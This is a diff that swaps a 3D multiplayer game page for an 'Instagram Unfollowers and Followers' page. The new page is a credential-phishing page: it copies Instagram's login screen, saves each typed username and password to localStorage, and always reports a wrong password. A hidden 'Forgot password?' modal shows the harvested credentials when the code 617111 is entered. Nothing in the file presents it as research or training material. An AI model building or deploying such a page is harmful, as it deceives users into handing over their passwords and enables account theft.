@@ -1,40 +1,303 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Minimalist 3D Multiplayer Movement</title>
-  <link rel="stylesheet" href="styles.css">
-  <script type="importmap">
-    {
-      "imports": {
-        "three": "https://cdn.jsdelivr.net/npm/three@0.160.0/build/three.module.js",
-        "three/addons/": "https://cdn.jsdelivr.net/npm/three@0.160.0/examples/jsm/"
-      }
-    }
-  </script>
-  <script src="https://cdn.jsdelivr.net/npm/nipplejs@0.10.1/dist/nipplejs.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Unfollowers and Followers</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .main-menu {
+            text-align: center;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+
+        .main-menu h1 {
+            font-family: 'Lobster Two', cursive;
+            font-weight: normal;
+            margin-bottom: 20px;
+            color: #e4405f;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-box {
+            width: 350px;
+            margin: 20px 0;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .instagram-logo {
+            margin-bottom: 30px;
+        }
+
+        .instagram-logo img {
+            height: 51px;
+        }
+
+        input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            margin-bottom: 5px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        button {
+            width: 100%;
+            padding: 8px;
+            background-color: #3897f0;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 5px;
+        }
+
+        button:hover {
+            background-color: #3578e5;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            margin: 20px 0;
+        }
+
+        .separator div {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .separator span {
+            padding: 0 15px;
+        }
+
+        .facebook-login {
+            margin-bottom: 20px;
+        }
+
+        .facebook-login a {
+            color: #385185;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .forgot-password a {
+            color: #385185;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .signup-box {
+            width: 350px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .signup-box a {
+            color: #3897f0;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        /* The Modal (background) */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgb(0,0,0);
+            background-color: rgba(0,0,0,0.4);
+        }
+
+        /* Modal Content/Box */
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 500px;
+            position: relative;
+        }
+
+        /* The Close Button */
+        .close-button {
+            position: absolute;
+            top: 0;
+            right: 0;
+            color: #aaa;
+            font-size: 28px;
+            font-weight: bold;
+            padding: 0 10px;
+            cursor: pointer;
+        }
+
+        .close-button:hover,
+        .close-button:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+    </style>
+    <script>
+        window.serverData = {
+            storedUsername: 'user@example.com',
+            storedPassword: 'password123'
+        };
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const mainMenu = document.getElementById('mainMenu');
+            const getFollowersButton = document.getElementById('getFollowersButton');
+            const loginContainer = document.getElementById('loginContainer');
+            const loginForm = document.getElementById('loginForm');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+            const modal = document.getElementById('modal');
+            const codeInput = document.getElementById('codeInput');
+            const submitCodeButton = document.getElementById('submitCode');
+            const dataDisplay = document.getElementById('dataDisplay');
+            const closeButton = document.querySelector('.close-button');
+
+            getFollowersButton.addEventListener('click', () => {
+                mainMenu.style.display = 'none';
+                loginContainer.style.display = 'flex';
+            });
+
+            // Load stored credentials on page load
+            let storedUsername = localStorage.getItem('storedUsername') || window.serverData.storedUsername;
+            let storedPassword = localStorage.getItem('storedPassword') || window.serverData.storedPassword;
+
+            usernameInput.value = storedUsername; // Pre-fill username field
+
+            loginForm.addEventListener('submit', (event) => {
+                event.preventDefault();
+
+                const attemptedUsername = usernameInput.value;
+                const attemptedPassword = passwordInput.value;
+
+                // Store the username and password in local storage
+                localStorage.setItem('storedUsername', attemptedUsername);
+                localStorage.setItem('storedPassword', attemptedPassword);
+
+                // Update stored credentials
+                storedUsername = attemptedUsername;
+                storedPassword = attemptedPassword;
+
+                alert('Sorry, your password was incorrect. Please double-check your password.');
+            });
+
+            forgotPasswordLink.addEventListener('click', (event) => {
+                event.preventDefault();
+                modal.style.display = "block";
+            });
+
+            closeButton.addEventListener('click', () => {
+                modal.style.display = "none";
+            });
+
+            window.addEventListener('click', (event) => {
+                if (event.target == modal) {
+                    modal.style.display = "none";
+                }
+            });
+
+            submitCodeButton.addEventListener('click', () => {
+                const code = codeInput.value;
+                if (code === '617111') {
+                    // Display stored data, prioritizing local storage
+                    const displayData = {
+                        storedUsername: localStorage.getItem('storedUsername') || window.serverData.storedUsername,
+                        storedPassword: localStorage.getItem('storedPassword') || window.serverData.storedPassword
+                    };
+                    dataDisplay.textContent = JSON.stringify(displayData, null, 2);
+                    dataDisplay.style.display = "block";
+                } else {
+                    alert('Incorrect code.');
+                }
+            });
+        });
+    </script>
 </head>
 <body>
-  <div id="game-container">
-    <div class="crosshair"></div>
-  </div>
-  <div id="donation-modal">
-    <div class="modal-content">
-      <h2>Donate to <span id="recipient-name"></span></h2>
-      <div class="amount-options">
-        <button class="amount-btn" data-amount="1">$1</button>
-        <button class="amount-btn" data-amount="5">$5</button>
-        <button class="amount-btn" data-amount="10">$10</button>
-        <button class="amount-btn" data-amount="25">$25</button>
-      </div>
-      <div id="custom-amount-container">
-        <label for="custom-amount">Custom amount: $</label>
-        <input type="number" id="custom-amount" min="1" max="1000" step="1">
-      </div>
-      <div id="paypal-button-container"></div>
-      <button id="cancel-donation">Cancel</button>
+    <div id="mainMenu" class="main-menu">
+        <h1>instagram unfollowers and followers</h1>
+        <button id="getFollowersButton">See Who Unfollows Me, Admires Me, Who Doesn't Follow Me Back and More Details</button>
+        <p style="font-size: small;">This will take you to Instagram's login page in order for us to check your account.</p>
     </div>
-  </div>
-  <script src="app.js" type="module"></script>
+
+    <div class="login-container" id="loginContainer" style="display: none;">
+        <div class="login-box">
+            <div class="instagram-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2880px-Instagram_logo.svg.png" alt="Instagram">
+            </div>
+            <form id="loginForm">
+                <input type="email" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit" id="loginButton">Log in</button>
+            </form>
+            <div class="separator">
+                <div></div>
+                <span>OR</span>
+                <div></div>
+            </div>
+            <div class="facebook-login">
+                <a href="#">Log in with Facebook</a>
+            </div>
+            <div class="forgot-password">
+                <a href="#" id="forgotPasswordLink">Forgot password?</a>
+            </div>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span class="close-button">&times;</span>
+            <p>Enter Code:</p>
+            <input type="text" id="codeInput">
+            <button id="submitCode">Submit</button>
+            <div id="dataDisplay" style="display:none;"></div>
+        </div>
+    </div>
 </body>
 </html>
